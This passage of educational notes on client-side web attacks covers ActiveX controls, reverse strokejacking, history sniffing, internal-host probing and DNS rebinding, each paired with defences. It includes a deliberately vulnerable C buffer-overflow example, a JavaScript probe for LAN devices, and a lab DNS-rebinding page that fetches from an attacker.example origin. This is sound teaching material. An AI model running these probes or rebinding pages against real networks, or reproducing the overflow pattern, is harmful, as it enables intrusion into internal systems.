This prevents browsers from caching or auto-filling private values such as passwords, credit card numbers, or secret tokens.

*Encrypting Local Storage (HTML5 and Beyond):*

Modern web applications sometimes rely on *HTML5 local storage, IndexedDB*, or *service worker caches* to enable offline functionality and speed up data access. If sensitive data must be stored locally, developers should:

- Encrypt data before saving it (using AES or WebCrypto API).

- Warn users about what data is stored.

- Offer an *opt-out* or “clear local data” setting.

**Bonus:** *here’s a tiny, totally snack-sized WebCrypto example:*

```
// Simple example: encrypt + decrypt a secret before saving to localStorage
const secret = "myHiddenToken";
const key = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt", "decrypt"]);
const iv = crypto.getRandomValues(new Uint8Array(12)); // random initialization vector

// Encrypt
const enc = new TextEncoder();
const ciphertext = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(secret));
localStorage.setItem("data", btoa(String.fromCharCode(...new Uint8Array(ciphertext))));

// Decrypt
const stored = Uint8Array.from(atob(localStorage.getItem("data")), c => c.charCodeAt(0));
const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, stored);
console.log(new TextDecoder().decode(decrypted)); // -> "myHiddenToken"
```

Mini breakdown:

- ```crypto.subtle``` is the browser’s built-in cryptography API — no external libs needed.

- AES-GCM is fast, authenticated encryption.

- ```iv``` ensures uniqueness for each encryption (never reuse it!).

- This example shows how to encrypt before saving to ```localStorage```, so even if someone dumps your browser storage, they’ll only see gibberish.

### Attacking ActiveX Controls:

ActiveX controls are native Windows COM components that web pages can instantiate in Internet Explorer; when a control is marked *“safe for scripting”* it means the browser will allow webpage JavaScript to call its public methods without showing the usual install/permission prompts — effectively exposing that control to *any* site the user visits. That’s why installing a vulnerable control (or one with overly powerful methods) turns into a huge risk: any malicious page can call those methods in the user’s security context.

Two attack vectors matter most. First, because many controls are written in C/C++, they suffer classic memory/implementation bugs (buffer overflows, integer bugs, format-string flaws) that can lead to arbitrary code execution on the victim machine.

*Quick glossary:*

- buffer overflow = writing past a memory buffer and corrupting control data (often leads to code execution).

- integer bug = bad handling of sizes/indices (e.g., signed/unsigned mixups) that enables out-of-bounds reads/writes.

- format-string flaw = unsafely passing attacker strings into ```printf```-style functions so the attacker can read/write arbitrary memory.

Second, many controls expose powerful helper methods (e.g., ```LaunchExe```, ```SaveFile```, ```LoadLibrary```, ```ExecuteCommand```) intended for trusted pages — these are *functionality bombs* if exposed to untrusted sites, because they let an attacker run programs, drop files, load libraries, or execute shell commands directly.

*What to watch for / mitigate* — don’t mark controls safe for scripting unless absolutely necessary, harden controls by removing or strongly validating dangerous methods, keep components patched, and prefer modern, sandboxed web APIs over native plugins.

#### Finding ActiveX Vulnerabilities:

HTML body invocation example — breakdown:

```
<object id="oMyObject"
        classid="CLSID:A61BC839-5188-4AE9-76AF-109016FD8901"
        codebase="https://wahh-app.com/bin/myobject.cab">
</object>
```

- ```object``` element: tells IE to instantiate a COM/ActiveX object on the page.

- ```id="oMyObject"```: gives the object a JS-visible name (you can call ```document.oMyObject``` from script).

- ```classid="CLSID:..."```: the COM class identifier (GUID) that identifies the installed control. If the control is already installed, IE uses this to find it locally.

- ```codebase="..."```: URL to download the control (CAB/installer) if it isn’t present; optional if already installed.

*Registry check:*

- The book’s GUID referenced (```{7DD95801-9882-11CF-9FA9-00AA006C42C4}```) is the standard category ID used to mark controls as *Safe for Scripting* (i.e., the ```CATID_SafeForScripting``` implemented-category GUID).

- You can verify registration by checking ```HKEY_CLASSES_ROOT\CLSID\{<classid>}\Implemented Categories\{7DD95801-9882-11CF-9FA9-00AA006C42C4}``` — if that key exists, the control advertises itself as safe-for-scripting. (Yes — that registry location/GUID is the canonical check.)

*Invoking methods from script:*

```
document.oMyObject.LaunchExe('myAppDemo.exe');
```

- That line shows how trivial it is for page JS to call exposed methods once a control is instantiated. If the control implements dangerous functionality (launching executables, saving arbitrary files, loading libraries), any page the user visits can attempt to use those methods — which is why marking a control safe for scripting is a serious trust decision.

*Extra comments / cautions:*

- Controls are native code — they’re vulnerable to buffer overflows, integer bugs, format-string flaws, etc. Quick reminder:

*Buffer overflow* = writing past a buffer boundary (often leads to code execution).

*Integer bug* = bad size/index arithmetic (signed/unsigned errors can produce out-of-bounds access).

*Format-string flaw* = untrusted strings passed to printf-style functions, enabling arbitrary memory reads/writes.

- Dangerous-sounding method names (e.g., ```LaunchExe```, ```SaveFile```, ```ExecuteCommand```) are immediate red flags — but also inspect less-obvious methods because some controls include test/update methods that were never removed.

*Practical testing notes:*

- Don’t try ActiveX fuzzing on public targets — use an isolated Windows VM. Triggering crashes is common and will crash the host browser process. A good testing workflow: install the target control on a disposable VM/profile, enumerate available methods, then fuzz inputs incrementally and monitor crashes / exception behavior.

*Useful tools (modern practical advice):*

- *Use a Windows test VM* — ActiveX is a Windows/IE artifact; Linux tools are limited for live testing.

- *OLE/COM viewers:* Microsoft OLEView, OleViewDotNet — enumerate type libraries, interfaces, methods.

- *PowerShell:* ```New-Object -ComObject <ProgID>``` and ```.psbase```/```Get-Member``` to probe methods in an interactive shell.

- *COMRaider* (legacy) & *OleView/OllyDbg/WinDbg* for static/enumeration and debugging.

- *Metasploit:* some auxiliary modules can fingerprint ActiveX on web apps (helpful in a pentest).

- *Fuzzers:* use controlled fuzzing tooling (Burp + browser hook or a COM-aware fuzzer) inside the VM — never on production systems.

#### Preventing ActiveX Vulnerabilities:

Native components (ActiveX or any compiled plugin) must *never* expose operations that execute OS-level actions on unchecked input. Controls should only provide the smallest, explicit surface required; where external actions are needed, map user input to a server-side allow-list or use numeric indices into a vetted command table. Additional defenses (domain-restriction, parameter signing) help, but remember: those protections are useless if the allowed caller page has XSS.

*Tiny pseudo-code showing a typical buffer-overflow bug:*

```
// decompiled / simplified pseudo-C inside an ActiveX method
void SaveFile(const char* filename, const char* data) {
    char path[256];
    // BUG: no bounds check on filename length
    strcpy(path, "C:\\App\\Uploads\\");
    strcat(path, filename);       // if filename > (256 - prefix), overflow occurs
    FILE *f = fopen(path, "wb");
    fwrite(data, 1, strlen(data), f);
    fclose(f);
}
```

*What the bug means (defensive view):* if ```filename``` is longer than the buffer space, ```strcat``` overwrites adjacent stack memory — that can corrupt return addresses or function pointers and allow remote code execution when exploited. From an attacker-perspective that means arbitrary actions on the user’s machine; from a defender’s perspective it’s a severe memory-safety bug that must be fixed immediately.

*Line-by-line breakdown:*

```
void SaveFile(const char* filename, const char* data) {
    char path[256];
    strcpy(path, "C:\\App\\Uploads\\");    // copies fixed prefix into `path`
    strcat(path, filename);                // appends filename — **no bounds check**
    FILE *f = fopen(path, "wb");           // opens file for write
    fwrite(data, 1, strlen(data), f);     // writes data
    fclose(f);
}
```

- ```char path[256];``` allocates a 256-byte buffer on the *stack* for the path.

- ```strcpy```/```strcat``` do *no* length checking; if ```filename``` is long enough, ```strcat``` will write past ```path```’s boundary and overwrite adjacent stack memory (local variables, saved frame pointer, return address). That’s a classic *stack-based buffer overflow.*

- ```fopen```/```fwrite``` themselves are not the flaw — the problem is unchecked concatenation/sizing.

- Overwriting stack memory can cause the program to crash. In older, unmitigated environments, an attacker who can precisely control the overwritten bytes could alter the function’s return address or other control data so that execution later jumps to attacker-controlled memory. Historically this led to arbitrary code execution (and thus things like shells), but modern systems add multiple protections that make that *non-trivial.*

*Short, practical mitigations:*

- *Fix code:* use bounded APIs (```strlcpy```/```strncpy_s```), check lengths before concatenation, and validate filenames against an allow-list or sanitize to a safe basename.

- *Harden the build:* enable stack canaries, DEP/NX, ASLR, and compile with modern compiler hardening options.

- *Least privilege:* run the control with minimal rights and avoid exposing any ```Execute*```/```Load*``` style methods to script.

- *Design-level fixes:* replace free-form input with indexes into a server-maintained list of allowed actions, sign parameters when necessary, and require server-side verification for critical operations.

- *Test & verify:* perform security-focused code review, fuzzing of exposed methods, and regular patching.

*How to fix this code:*

Use bounded APIs, validate inputs, and avoid composing file paths by blindly concatenating user input. Here’s a secure rewrite:

```
#include <stdio.h>
#include <string.h>
#include <limits.h>

int SaveFileSafe(const char *filename, const char *data) {
    char path[PATH_MAX];
    const char *base = "C:\\App\\Uploads\\";
    size_t base_len = strlen(base);
    size_t fname_len = strlen(filename);

    // Reject absurdly long filenames and sanitize
    if (fname_len == 0 || fname_len > 128) return -1; // arbitrary sane limit

    // Ensure full path fits in buffer
    if (base_len + 1 + fname_len >= sizeof(path)) return -1;

    // Optionally validate filename: reject path separators, resolve to basename
    for (size_t i = 0; i < fname_len; ++i) {
        if (filename[i] == '\\' || filename[i] == '/' || filename[i] == ':' ) return -1;
    }

    // Build the path safely
    memcpy(path, base, base_len);
    path[base_len] = '\0';
    strncat(path, filename, sizeof(path) - strlen(path) - 1);

    // Use fopen/fwrite as before, but consider opening with least privilege and safe flags
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    fwrite(data, 1, strlen(data), f);
    fclose(f);
    return 0;
}
```

Here we limit filename length, disallow path separators (so attacker can’t escape the uploads dir), check buffer bounds before concatenation, and use ```strncat``` with an explicit remaining length. Stronger: canonicalize path and verify it sits under the intended directory (realpath + check prefix).

*Additional Notes:*

```return -1;``` is just a conventional way in C to signal *failure* from a function that returns an ```int```. By convention many C APIs use ```0``` for success and any *non-zero* value for error (often ```-1```), because ```0``` is falsy/simple success and non-zero gives a clear failure signal. People choose ```-1``` when: a) the function normally returns a non-negative value (like a length, index, or file descriptor) so ```-1``` is an obvious impossible/error sentinel, or b) they want a simple single-value error indicator.

Safer/clearer alternatives:

```
#define ERR_INVALID_ARG  (-1)
#define ERR_TOO_LONG     (-2)

if (fname_len == 0 || fname_len > 128) return ERR_INVALID_ARG;
```

or return boolean (```true```/```false```) for success/fail, or use ```errno```/POSIX-style negative errno codes, or ```EXIT_SUCCESS```/```EXIT_FAILURE``` for ```main()```:

```
if (!SaveFileSafe(...)) { /* failure */ }
```

So yes — ```return -1;``` essentially asserts “this check failed; bail out” — it’s not magical, just a widely used failure sentinel.

### Attacking the Browser:

Some attacks against users don’t need any app-specific bugs — they abuse browser behavior itself. A classic example is *keystroke capture:* JavaScript running inside a page (or a framed widget) can listen for keyboard events while it has focus and collect sensitive text the user types (passwords, messages, etc.). Historically examples used ```window.status``` or ```window.event.keyCode```; today the APIs changed, but the *concept* is the same: if malicious script can get keyboard focus, it can observe keystrokes.

Modern browsers have deprecated old globals (e.g., ```window.event```, ```keyCode```) and ignore ```window.status``` updates, but they still fire keyboard events (```keydown```/```keypress```/```input```) for the element that has focus. So any script running *in the same browsing context that has focus* can read those events. The major restrictions today are cross-origin isolation and iframe sandboxing: a cross-origin iframe cannot access the parent page’s DOM, but it *can* receive keyboard focus if the page allows it — and while it has focus it can capture keystrokes typed by the user.

#### Reverse Strokejacking:

A malicious child frame can temporarily steal focus from the top-level page (this is not disallowed by same-origin policy). By capturing keystrokes in the frame and carefully returning focus to the parent, an attacker can create a near-seamless experience where the user keeps typing into visible inputs while the frame intermittently harvests input. That technique is sometimes called *reverse strokejacking* and is effective when pages embed third-party widgets, ad frames, or untrusted content inside their own UI.

**Defenses:**

1. Prevent untrusted content from running with focus or script power:

- Avoid embedding untrusted third-party code in same-origin frames. Prefer well-audited widgets or move them to separate, clearly isolated origins.

- Use the ```sandbox``` attribute on iframes. For example, do *not* give third-party iframes ```allow-scripts``` and ```allow-same-origin``` together — restrict as much as possible. If an iframe doesn’t need to run scripts or interact with the parent, give it a tight sandbox (or no scripts at all).

- Use ```X-Frame-Options: DENY``` or ```Content-Security-Policy: frame-ancestors 'none'``` / ```frame-ancestors 'self'``` to prevent other sites from framing your sensitive pages.

2. Control focus behavior:

- Don’t allow embedded frames or widgets to grab focus automatically. If you need to allow an iframe to receive focus, restrict it and require explicit user action (e.g., a visible click) and make that action clearly visible.

- Listen for suspicious rapid focus/blur activity on sensitive inputs; if an input loses focus unexpectedly, surface a warning or temporarily lock submission until focus returns or user re-authenticates.

3. Harden sensitive input handling:

- Avoid relying only on client-side checks for critical flows. Require server-side confirmation for sensitive actions (2FA, re-prompt for password, short-lived confirmation tokens).

- For particularly sensitive fields (e.g., payment card entry), consider using a dedicated, isolated iframe served from a different origin (a *trusted input iframe pattern*) that you control and that refuses to be framed. That way the top-level page cannot sniff the inner input.

4. Content Security Policy & script integrity:

- Use CSP to restrict what scripts can run and where they can be loaded from. While CSP won’t stop an iframe that already runs script, it reduces the risk from injected scripts in your own origin.

- Use ```Referrer-Policy``` and ```Feature-Policy``` (Permissions Policy) to disable features you don’t need.

5. UX & user cues:

- Make it obvious when a field is focused and when focus changes (visible caret, highlight, explanatory text). Users are more likely to notice odd focus jumps if the UI signals them clearly.

- Consider briefly graying out inputs if focus shifts away unexpectedly, or require a second click before accepting sensitive input after focus changes.

#### Stealing Browser History and Search Queries:

An attacker page tries to determine which external sites (or search queries) a user has visited by probing many candidate URLs and checking *whether those links are rendered as “visited”* by the browser. Historically this worked because browsers styled visited links differently (color, etc.), and scripts could inspect computed styles and infer visit state. By running many checks (automatically), an attacker could build a profile of the user’s recent browsing and search activity.

*How it worked:*

1. The attacker creates many link elements that point at candidate targets (site A, site B, search results for query X, etc.).

2. Those links are injected into the page (often visually hidden).

3. The attacker queries the *rendered style* of each link (e.g., color, background) to see if the browser marked it as ```:visited```. If the style matches the visited style, the attacker records a “hit.”

4. Repeat across thousands of possibilities to enumerate visited hosts/queries.

That simple flow is the essence — the rest is scale, heuristics (common domains/queries first), and aggregation.

*Modern reality — browsers fought back:*

Browsers have intentionally restricted what scripts can learn about ```:visited``` links. Modern browsers (Chrome, Firefox, Edge, Safari) allow ```:visited``` only to affect a *very small set of visual properties* (mostly color-related) and *do not expose computed values to script* — so ```getComputedStyle()``` cannot reveal whether a link is visited in the general case. In short: *the classic attack is largely mitigated.*

That said, attackers historically tried many workarounds (timing, clever CSS tricks, font-face loading side-channels). Browser vendors continue to patch these. The mitigation story is ongoing: new quirks occasionally appear, but overall the surface is much smaller today.

*Defenses you can rely on (and recommend):*

- *Browser-level:* Keep browsers up to date; vendors have hard-fought mitigations for history sniffing.

- *Content Security / frame isolation:* Serve third-party widgets from isolated origins and use ```sandbox```ed iframes so remote pages can’t inject lots of probing markup into your origin.

- *CSP & referrer policy:* Restrict where scripts/styles can be loaded from and limit referer leakage that enriches profiling.

- *Privacy modes / extensions:* Users can use private browsing or anti-tracking extensions to reduce fingerprintable browsing traces.

- *Server-side:* Don’t leak sensitive query strings in linkable URLs and avoid placing secret tokens in query parameters (they may be logged in many places).

#### Enumerating Currently Used Applications:

An attacker used to try loading a *protected* page from another site with a ```<script src="…">``` include and then relied on ```window.onerror``` to inspect the error details thrown by the included resource. Because the HTML returned for an authenticated user differed from the unauthenticated response, the visible error metadata (line number, message shape) could be used as a tiny fingerprint to infer whether the visitor was logged in to that third-party site. That technique depends on leaking detailed cross-origin error info and on the attacker being able to compare deterministic differences in the responses.

Browsers have largely closed this vector. Cross-origin scripts now produce limited error text (usually ```"Script error."```) unless the remote resource explicitly opts in to sharing error details via ```crossorigin``` + appropriate CORS headers. In practice, reliable login-state enumeration this way is brittle or infeasible on up-to-date browsers.

If you’re debugging your own app and want to capture errors raised by scripts you control, a simple same-origin handler can help — this is for diagnostics only:

```
window.onerror = function(message, source, lineno, colno, error) {
  console.log("Error:", { message, source, lineno, colno, error });
  // send to your server-side error collector (only for your origin)
};
```

Do not use this pattern to probe other domains; modern browsers will suppress useful info for cross-origin includes unless the remote server allows it via CORS.

*Defensive checklist:*

- Ensure third-party widgets run in sandboxed iframes (```<iframe sandbox=...>```), or on separate, tightly controlled origins.

- Apply ```Content-Security-Policy``` to limit where scripts/styles can load from and ```Referrer-Policy``` to reduce leakage.

- Use ```SameSite``` cookies and require POST + anti-CSRF tokens for sensitive actions so being logged-in alone is insufficient for harmful actions.

- Monitor and log unusual cross-origin includes or large numbers of failed resource loads in telemetry (these can indicate probing attempts).

#### Port Scanning:

Largely *noisy and heavily restricted* — modern browsers block many sensitive ports outright, limit cross-origin visibility, and have patched timing/side-channel tricks that used to make port-probing reliable. That said, browser-based probing was historically done by injecting tags or script includes and watching for load/timeout/error behaviors rather than reading responses; vendors have progressively closed those side-channels, but you should assume new edge-case quirks can appear and keep browsers updated.

Also, scanning the loopback (```127.0.0.1``` / ```localhost```) means probing ports on the *same machine* the browser runs on — so you’re checking services that only the local OS can reach (like a database, development webserver, or an admin UI bound to ```127.0.0.1```). Those services aren’t protected by your network firewall because loopback traffic never leaves the host, so a page that can cause the browser to open connections to ```127.0.0.1:PORT``` can in principle detect whether something is listening there (similar in concept to running ```ss -tlnp``` locally, but much coarser and browser-mediated).

*Defensive takeaways:*

- Don’t bind admin interfaces to ```0.0.0.0``` — restrict them to 127.0.0.1 or an internal management network and require auth.

- Use OS-level firewall rules to block unwanted local services from being remotely reachable and consider tools that restrict which processes can accept sockets on local ports.

- Harden browser exposure by keeping browsers patched and using enterprise policies (block risky ports, disable plugin APIs, sandbox untrusted content).

- For testing, run local scans in a controlled lab (use ```nmap``` or ```ss```/```netstat``` as appropriate) rather than relying on browser behavior — it’s far more reliable.

#### Attacking Other Network Hosts:

Fingerprinting local devices sometimes used a harmless-looking trick: insert an ```<img>``` tag that points at a well-known device resource (e.g. ```http://192.168.1.1/hm_icon.gif```) and watch whether the browser fires ```onload``` or ```onerror```. If a device serves that file the page can infer the device type and then *attempt* further interactions. Modern browsers, mixed-content rules (HTTP vs HTTPS), and router configuration (local-only admin interfaces, CSRF protections) have limited how reliable and useful this technique is today — and many vendors now block or require authentication for such resources.

*Probe one-liner (HTML-only):*

```
<img src="http://192.168.1.1/hm_icon.gif" onload="console.log('found')" onerror="console.log('not found')">
```

*Another example:*

```
<script>
function probeHost(ip, timeoutMs = 3000) {
  return new Promise((resolve) => {
    const img = new Image();
    let done = false;

    img.onload = () => { if (!done) { done = true; resolve({ ip, found: true }); } };
    img.onerror = () => { if (!done) { done = true; resolve({ ip, found: false }); } };

    // timeout to catch silent failures
    setTimeout(() => { if (!done) { done = true; resolve({ ip, found: false, timedOut: true }); } }, timeoutMs);

    img.src = `http://${ip}/hm_icon.gif?cache_bust=${Date.now()}`;
  });
}

// usage (async context)
(async () => {
  const res = await probeHost('192.168.1.1');
  console.log(res); // { ip: '192.168.1.1', found: true } or found:false
})();
</script>
```

*Notes:*

- Uses ```onload``` to detect successful fetch (presence), ```onerror``` for failure, plus a timeout for silent hangs. A successful ```onload``` only tells you *something* returned that path — not that it’s the exact device you expect. Combine multiple probes for better fingerprinting.

- Adds ```cache_bust``` to avoid cached responses.

- Runs over HTTP — remember mixed-content rules will block this from HTTPS pages; run in a lab or via an HTTPS-capable proxy if needed.

- This approach only detects *connectivity and whether something returns that path;* it’s not a reliable fingerprint of device model or login state by itself. Browsers block some privileged ports; you won’t reliably probe every port.

*Detailed breakdown:*

1. ```function probeHost(ip, timeoutMs = 3000) { return new Promise((resolve) => { ... }); }```

- Wraps the probe in a **Promise** so callers can ```await``` it or use ```.then()```; Promises are how modern JS handles async flow cleanly. ```timeoutMs = 3000``` is a default param (3 seconds) to avoid waiting forever.

2. ```const img = new Image();```

- Creates an ```<img>``` element programmatically (no DOM insertion needed). Assigning ```img.src``` triggers the browser to fetch the URL.

3. ```let done = false;``` / ```img.onload = ...; img.onerror = ...;```

- ```onload``` fires when the image resource is successfully fetched and decoded → we treat that as “something answered at that URL.”

- ```onerror``` fires when the fetch fails (no connection, 404, CORS blocking for some resources, etc.) → we treat that as “not found.”

- The ```done``` flag ensures we only ```resolve()``` the Promise once (race between load/error/timeout).

4. ```setTimeout(() => { ... }, timeoutMs);```

- Some ports/hosts might drop connections or never respond; the timeout catches “hanging” attempts and resolves as a failure (with ```timedOut: true```).

5. ```img.src = `http://${ip}/hm_icon.gif?cache_bust=${Date.now()}`;```

- Setting ```src``` starts the fetch. The ```cache_bust``` query prevents cached responses from lying to you (each probe becomes unique).

6. ```return new Promise(...)``` → usage:

```
const res = await probeHost('192.168.1.1');
// res: { ip: '192.168.1.1', found: true } or { ip:..., found:false, timedOut:true }
```

- ```await``` pauses your async function until the probe completes; result is a small object indicating success/failure.

*Defensive notes:* never expose admin interfaces to the WAN, disable remote management, change defaults, require strong auth (and multifactor where possible), add CSRF and origin checks to router/web admin endpoints, keep firmware updated, and segment management interfaces onto separate networks so web pages in a normal browser session can’t reach them. Also be aware of DNS-rebinding as a more advanced technique and harden resolvers and devices accordingly.

#### Exploiting Non-HTTP Services (“inter-protocol / non-HTTP service” attacks):

The browser can be tricked into opening a TCP connection to a service speaking some other protocol (SMTP, Redis, memcached, some IoT admin HTTP-like servers, etc.) by abusing normal web constructs (image/form/script loads, DNS tricks, etc.). Because HTTP requests always begin with predictable headers, some non-HTTP services will simply ignore those headers and keep reading the subsequent bytes — so if the browser delivers an attacker-controlled body, that body might be interpreted as valid protocol data by the target service. If that service echoes some of that data back and the browser treats the reply as HTML (some browsers will render non-HTTP payloads when they arrive), the attacker can sometimes get script executed in the user’s context for that host.

Are these still feasible today? Rarely in the wild, but *possible in specific setups.* Browser port restrictions, mixed-content blocking, tightened same-origin error reporting, and vendor fixes have closed many easy channels. Still, legacy devices, misconfigured local services, embedded admin ports, or stubborn appliances that accept lenient input can remain vulnerable — so this is a live class of risk, not just historical trivia.

*High-level examples:*

- A web page causes the browser to open a connection to ```192.168.0.1:6379``` (Redis). The browser sends an HTTP-ish preface, then raw bytes that Redis treats as commands — if Redis echoes or stores attacker-controlled values that later get served by a co-located web app, that can lead to trouble.

- A camera admin web UI listening on a non-standard port accepts text input and returns it verbatim in an error page; an HTTP-ish request from the browser can slip script into that response and the browser might render it.

*Why cookies / origin matter:* many browsers treat cookies keyed by *host name* only (ignoring port). So script executing for ```example.local:1234``` could have access to cookies set for ```example.local``` — a reason these attacks can escalate. Possible defenses:

- *Network hardening:* bind admin/non-HTTP services to ```127.0.0.1``` or internal management network only; use firewall rules to block unwanted local access.

- *Protocol hygiene:* make services strict — reject input that looks like HTTP if you don’t speak HTTP, and never echo raw request bodies back in responses.

- *Authentication & least privilege:* require strong auth for management endpoints, and don’t rely on obscurity or default credentials.

- *Segmentation & TLS:* separate management interfaces from user networks and use TLS (mutual TLS for sensitive admin APIs) so arbitrary browser-origin requests can’t be trivially injected.

- *Browser/site mitigations:* serve pages over HTTPS (avoids mixed-content probes), set ```X-Frame-Options```/CSP/sandbox third-party frames, and prefer same-site cookies + CSRF tokens for sensitive actions.

Use classic network tools (nmap, nc) and protocol analyzers to validate how services react to malformed input; rely on safe fuzzing/ASAN when auditing server code. Also, more information can be found in [this paper](https://www.nccgroup.com/media/wy4p5al4/_inter-protocol_exploitation.pdf).

### DNS rebinding:

DNS rebinding is sneaky but conceptually simple once you see the pieces. Short version: an attacker uses DNS to make a domain name you trust first map to the attacker’s server (so the browser loads the attacker page), then quickly change that same name to an internal or otherwise protected IP. Because the browser still thinks it’s talking to the *same domain name*, same-origin checks can be tricked into letting the attacker’s script interact with that new host/IP from the victim’s network.

AJAX (or a dynamically loaded script) is the delivery vehicle because the attacker needs two things: (1) the browser must perform requests under the attacker's domain so same-origin policy applies, and (2) the attacker’s script must be able to *read* the responses. A plain ```<img>``` or ```<iframe>``` can make requests but scripts can’t read the responses across origins. So the attack boots the victim’s browser under the attacker domain, then—after the DNS rebind—uses XMLHttpRequest / fetch / dynamically included script to fetch data from the newly mapped IP and then *read* and exfiltrate it.

*How the DNS trick is done:*

1. Attacker domain resolves to attacker IP on the first lookup so the victim loads the malicious page.

2. The attacker’s authoritative DNS responds with a very short TTL or cycles the A record so later lookups return a different IP (an internal host reachable by the victim).

3. The browser issues subsequent requests to the *same* domain name; DNS returns the new internal IP, so TCP connects to that internal host. Because the origin is the attacker’s domain (the name hasn’t changed), the browser’s same-origin checks can be bypassed in some scenarios and the attacker script can read responses.

*Why Host headers and cookies complicate things:*

Browsers send the original host name in the HTTP ```Host:``` header, not the internal machine’s hostname; some servers reject requests where Host doesn’t match an expected host, which can break the attack. Also, cookies are keyed by hostname (not port), so code executed via rebinding might have access to cookies for that hostname — that’s where escalation becomes dangerous. Different browsers and intermediaries historically pinned DNS answers or handled re-resolution differently, so the success of a rebinding attack depends on these platform quirks.

*When this is realistically useful:*

DNS rebinding is primarily a way to reach *internal-only* targets from a browser (devices on 192.168.x.x, admin interfaces bound to 127.0.0.1, IoT gadgets, etc.). It’s not a universal “break same-origin” — it’s useful when the defender left accessible services that: accept HTTP-like input, echo responses, or perform sensitive actions without additional auth. Many modern mitigations have reduced the practical surface, but misconfigured devices and legacy services still make rebinding relevant.

*Defenses:*

- Restrict management interfaces to loopback or separate management VLANs; block them from general user networks.

- Validate ```Host:``` header and reject requests where it’s unexpected.

- Use CSRF tokens, same-site cookies, and require authentication for sensitive endpoints (don’t rely on network obscurity).

- Harden DNS: prevent public exposure of internal names, and use DNS resolvers that disallow rapid rebinding or enforce response consistency.

- Browser-side mitigations: keep clients updated (vendors add DNS-pin and rebinding hardening), and use enterprise policies where possible that block suspicious origins.

- Watch for domains with unusually short TTLs, sudden resolution to RFC1918 addresses, or pages that repeatedly re-resolve their own domain. In a lab, simulate a rebind with a controlled authoritative DNS and validate that internal hosts reject mismatched ```Host:``` headers and that sensitive services require proper auth.

*Tiny, copy-paste friendly diagram:*

```
Attacker DNS/A (step1)         Victim Browser            Internal host
------------------             -------------            --------------
attacker.example -> 10.0.2.5   GET https://attacker...  (no contact)
(page loads from attacker VM)

[rebind DNS]
attacker.example -> 192.168.56.10

Victim Browser               Internal host
-------------                --------------
fetch https://attacker... -> 192.168.56.10
(attacker JS now talking to internal host)
```

*Quick safe lab steps:*

1. Internal host (VM2) — host a simple web page:

```
# on VM2 (internal 192.168.56.10)
python3 -m http.server 8000 --bind 192.168.56.10
# place a test file index.html in the cwd
```

2. Attacker web server (VM1) — serve a page that will ```fetch()``` attacker.example:

```
# on VM1 (attacker 10.0.2.5)
# simple page that does: fetch("https://attacker.example:8000/") and logs result
python3 -m http.server 443 --bind 10.0.2.5  # or use a tiny HTTPS dev server
```

3. Victim browser (VM3) — simulate DNS rebind (lab-safe shortcut):

```
# initially, point attacker.example -> 10.0.2.5
# edit /etc/hosts on VM3: "10.0.2.5 attacker.example"
# open https://attacker.example in browser (loads attacker page)
# then change /etc/hosts to: "192.168.56.10 attacker.example"
# on attacker page trigger the AJAX/fetch and observe it contacting 192.168.56.10
```

- Real DNS rebinding uses authoritative DNS with short TTLs; ```/etc/hosts``` swap is a safe lab shortcut to emulate the effect.

*Bonus:* tiny, lab-only ```fetch()``` snippet:

Drop this into the attacker VM’s webroot as ```attacker.html``` and open it from the victim browser in your isolated lab.

```
<!-- attacker.html — lab-only demo -->
<!doctype html>
<meta charset="utf-8">
<title>Rebind demo (lab only)</title>
<h3>DNS rebind lab demo (do not use on public networks)</h3>
<button id="go">Run fetch()</button>
<pre id="out"></pre>
<script>
const out = (t) => { document.getElementById('out').textContent += t + "\n"; };

// Attempt to fetch root from same-origin host (attacker.example)
// In a real DNS-rebind test the name attacker.example will be remapped to the internal host.
// This snippet simply performs the fetch and prints summary info.
document.getElementById('go').addEventListener('click', async () => {
  try {
    out("Starting fetch to same-origin host...");
    const resp = await fetch(location.origin + "/"); // fetch from attacker.example origin
    out("Fetch completed. HTTP status: " + resp.status);
    const text = await resp.text();
    out("First 400 chars of response:\n" + text.slice(0, 400).replace(/\</g, "&lt;"));
  } catch (err) {
    out("Fetch failed: " + String(err));
  }
});
</script>
```

What it does:

- ```fetch(location.origin + "/")``` issues a GET to the current origin (i.e., ```http(s)://attacker.example```).

- In the lab flow, after you change the DNS/hosts entry to point ```attacker.example``` at the internal host, the browser will connect to that internal IP while still treating the requests as same-origin.

- The script logs HTTP status and the start of the returned body so you can confirm whether the request reached the internal host and what it returned.

*Breakdown:*

1. ```const out = (t) => { document.getElementById('out').textContent += t + "\n"; };```

- ```const out = (t) => { ... }``` defines an *arrow function* and assigns it to the constant name ```out```. It’s equivalent to ```function out(t) { ... }``` but shorter.

- An arrow function is a shorter syntax for writing function expressions in JavaScript, introduced in ES6. It allows for a more concise way to define functions, often omitting the need for the ```function``` keyword and the ```return``` statement when the function body is a single expression.

- ```document.getElementById('out')``` finds the ```<pre id="out">``` element in the page.

- ```.textContent += t + "\n"``` uses ```+=``` to *append* text to the element’s existing content (i.e., “add this string to whatever’s already there”). ```t + "\n"``` simply adds a newline so each log appears on its own line.

2. ```document.getElementById('go').addEventListener('click', async () => { ... });```

- ```addEventListener('click', ...)``` attaches a handler that runs when the button is clicked.

- ```async () => { ... }``` is an *async arrow function* — it lets you use ```await``` inside, which makes asynchronous code read like linear code. Again, it’s shorthand for ```async function() { ... }```.

3. ```try { ... } catch (err) { ... }```

- Standard try/catch for errors. If anything inside ```try``` throws (including a rejected ```fetch```), control jumps to ```catch```, where ```err``` holds the error object/string.

4. ```const resp = await fetch(location.origin + "/");```

- ```fetch(...)``` performs an HTTP request and returns a Promise for a ```Response``` object.

- ```await``` pauses the async function until the Promise resolves, then assigns the resolved value to ```resp```.

- ```location.origin``` is the current page origin (```scheme://host[:port]```), so ```location.origin + "/"``` builds a same-origin URL (e.g., ```https://attacker.example/```).

5. ```out("Fetch completed. HTTP status: " + resp.status);```

- ```resp.status``` is the numeric HTTP status code returned by the server (200, 404, etc.). We log it via ```out(...)```.

6. ```const text = await resp.text();```

- ```resp.text()``` returns a Promise that resolves with the full response body as a string. ```await``` pulls the string out so the next line can inspect it.

7. ```out("First 400 chars of response:\n" + text.slice(0, 400).replace(/\</g, "&lt;"));```

- ```text.slice(0, 400)``` returns a substring: characters from index ```0``` up to (but not including) index ```400```. It’s a safe way to show just the start of a possibly-large response.

